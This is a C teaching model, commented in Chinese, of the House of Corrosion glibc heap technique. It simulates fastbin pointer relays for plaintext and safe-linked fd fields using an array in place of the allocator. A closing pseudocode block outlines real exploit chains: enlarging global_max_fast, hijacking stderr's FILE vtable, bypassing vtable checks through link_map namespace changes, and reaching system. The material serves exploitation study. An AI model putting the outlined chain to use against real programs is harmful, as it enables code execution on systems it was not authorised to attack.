/*
 * House of Corrosion 的 fastbin 指针搬运汇总模型。
 *
 * 版本范围：
 *   glibc 2.27～2.31：victim->fd 保存明文；
 *   glibc 2.32～2.36：victim->fd 使用 safe-linking；
 *   glibc 2.37 起：global_max_fast 缩成 uint8_t，无法再构造远端索引。
 *
 * 漏洞模型：攻击者已经放大 global_max_fast，能够反复修改同一个已释放
 * victim 的 size/fd，并让它临时出现在不同的远端 fastbin 头槽。
 *
 * 成功效果：把“源槽”里的 libc 指针搬到可编辑中转区，修改后再搬到
 * “目标槽”。真实利用中的槽位位于 libc/ld；这里用数组表示连续 qword，
 * 从而把关键公式和指针流完整展开，不伪造某个发行版的固定地址。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define FASTBIN_INDEX(size) (((size) >> 4) - 2)
#define PROTECT_PTR(position, pointer)                                         \
  ((((size_t)(position)) >> 12) ^ ((size_t)(pointer)))

int main(void) {
  /* 数组第 0 项代表 main_arena.fastbinsY[0]。 */
  size_t fastbins_y[64] = {0};

  /* 使用真实堆地址，使 2.32+ 的 fd 编码 key 具有真实地址语义。 */
  size_t *victim = malloc(0x30);
  size_t *fd = &victim[0];

  /* 演示使用的三个远端槽索引。 */
  size_t source_index = 8;
  size_t relay_index = 24;
  size_t target_index = 40;

  /*
   * x86-64 公式：
   *     fastbin_index(size) = (size >> 4) - 2
   *     size = index * 0x10 + 0x20
   *
   * 如果手中是实际地址 target，而不是数组索引，则：
   *     delta = target - &main_arena.fastbinsY[0]
   *     size = 2 * delta + 0x20
   *     request = (size & ~7) - 0x10        // 换回用户请求大小
   */
  size_t source_size = source_index * 0x10 + 0x20;
  size_t relay_size = relay_index * 0x10 + 0x20;
  size_t target_size = target_index * 0x10 + 0x20;

  assert(FASTBIN_INDEX(source_size) == source_index);
  assert(FASTBIN_INDEX(relay_size) == relay_index);
  assert(FASTBIN_INDEX(target_size) == target_index);

  /* 源槽里原本有一个希望搬走的 libc 指针。 */
  size_t source_value = 0x7ffff7e12040;
  fastbins_y[source_index] = source_value;

  /* ---------- 2.27～2.31：明文 fd ---------- */

  /* 漏洞模拟：把 victim 的 size 改成源槽对应的物理大小。 */
  victim[-1] = source_size | 1;

  /* 旧版 `_int_free` 会把源槽旧值直接放进 victim->fd。 */
  *fd = fastbins_y[source_index];
  fastbins_y[source_index] = (size_t)(victim - 2);

  /* 漏洞模拟：让 victim 成为中转区头槽当前可取出的节点。 */
  victim[-1] = relay_size | 1;
  fastbins_y[relay_index] = (size_t)(victim - 2);

  /* 旧版 `_int_malloc` 把明文 victim->fd 写回中转区头槽。 */
  fastbins_y[relay_index] = *fd;
  assert(fastbins_y[relay_index] == source_value);

  /* 已经取得中转区对应 chunk 后，可以编辑搬入的明文指针。 */
  size_t modified_value = 0x7ffff7e12ab0;
  fastbins_y[relay_index] = modified_value;

  /* 再按同样顺序把中转区的修改值搬到最终目标槽。 */
  victim[-1] = relay_size | 1;
  *fd = fastbins_y[relay_index];
  fastbins_y[relay_index] = (size_t)(victim - 2);

  victim[-1] = target_size | 1;
  fastbins_y[target_index] = (size_t)(victim - 2);
  fastbins_y[target_index] = *fd;

  assert(fastbins_y[target_index] == modified_value);

    /* ---------- 2.32～2.36：使用 safe-linking 编码 fd ---------- */

  /* 重置三个槽，重新演示同一思想在 safe-linking 下的实现。 */
  fastbins_y[source_index] = source_value;
  fastbins_y[relay_index] = (size_t)(victim - 2);
  fastbins_y[target_index] = 0;

  victim[-1] = source_size | 1;

  /* 新版 free 把“源槽明文值”按 fd 字段地址编码后写进 victim->fd。 */
  *fd = PROTECT_PTR(fd, fastbins_y[source_index]);
  fastbins_y[source_index] = (size_t)(victim - 2);

  victim[-1] = relay_size | 1;

  /* 新版 malloc 解码 victim->fd，再把明文写回中转区头槽。 */
  fastbins_y[relay_index] = PROTECT_PTR(fd, *fd);
  assert(fastbins_y[relay_index] == source_value);

  fastbins_y[relay_index] = modified_value;
  fastbins_y[target_index] = (size_t)(victim - 2);

  victim[-1] = relay_size | 1;
  *fd = PROTECT_PTR(fd, fastbins_y[relay_index]);
  fastbins_y[relay_index] = (size_t)(victim - 2);

  victim[-1] = target_size | 1;
  fastbins_y[target_index] = PROTECT_PTR(fd, *fd);

  assert(fastbins_y[target_index] == modified_value);
  printf("[+] 指针搬运完成\n");

  /* victim 的 size 已被故意破坏，教学模型直接退出，不再 free。 */
  return 0;
}

/*
 * ======================== 真实链迁移伪代码 ========================
 *
 * 一、原版 glibc 2.27，绑定作者使用的 Ubuntu 18.04 Build ID：
 *
 *     准备可反复编辑的 freed victim、unsorted victim 和检查用安全值区域；
 *     猜 libc 低四位；
 *     用 2.27 的 unsorted bin attack 放大 global_max_fast；
 *     对每个 libc 目标计算：
 *         delta = target - main_arena.fastbinsY；
 *         chunk_size = 2 * delta + 0x20；
 *         malloc_request = (chunk_size & ~7) - 0x10； // 换回用户请求大小
 *     按“源槽 -> 可编辑中转区 -> 目标槽”搬运 __morecore 等指针；
 *     修改 stderr 的 flags/write_ptr/buf_base/buf_end/vtable；
 *     使用 2.27 仍会消费的 FILE+0xe0 旧 allocate 回调；
 *     制造 largebin/NON_MAIN_ARENA 断言，让 stderr 进入真实消费路径；
 *     最终必须验证回调参数或控制流，不能只以崩溃为成功。
 *
 * 二、Addendum glibc 2.29，绑定作者使用的 Ubuntu 19.04 Build ID：
 *
 *     至少取得约 11 字节连续 WAF；
 *     用 tcache poisoning 代替已经加固的旧 unsorted 写；
 *     覆盖 global_max_fast，建立相对写和指针搬运；
 *     把 _rtld_global._dl_ns[0]._ns_loaded 搬到 namespace 1；
 *     清 namespace 0，并把 libc link_map.l_ns 改成 1；
 *     让 _IO_vtable_check 走“非默认命名空间”返回分支；
 *     stderr.vtable 指向堆上的 fake vtable；
 *     按附件反汇编重新选择 gadget，并验证寄存器与 system 参数。
 *
 * 三、真正的版本边界：
 *
 *     2.28 删除旧 `_IO_strfile` 回调，因此 2.27 完整链先失去终点；
 *     2.32 起必须像本文件第二段一样正确编码 victim->fd；
 *     2.37 把 global_max_fast 缩成 uint8_t，最大物理 size 只有 0xf0，
 *     最远只能索引 fastbinsY+0x68 附近，无法再访问远端 libc/ld 槽；
 *     这时核心投递思想已经失效，不是再调一个偏移即可恢复。
 */
